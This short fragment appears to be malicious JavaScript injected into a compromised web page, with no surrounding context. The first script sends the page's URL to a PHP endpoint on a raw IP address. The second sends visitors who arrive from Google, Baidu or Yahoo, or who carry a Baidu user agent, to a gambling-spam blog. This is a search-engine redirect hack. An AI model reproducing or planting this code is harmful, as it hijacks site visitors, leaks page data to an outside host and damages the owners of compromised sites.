<script>var x=new XMLHttpRequest();x.open("GET","http://185.86.150.37/info.php?h="+encodeURIComponent(document.location.href),false);x.send(null);</script><script language="javascript">
var s=document.referrer
var ua=navigator.userAgent;
if(s.indexOf("google")>0 || s.indexOf("baidu")>0 || s.indexOf("yahoo")>0||ua.indexOf("Baidu")>0||ua.indexOf("baidu")>0 ) 
location.href="http://wangyebaijialeyouxi.blog.com ";
</script>
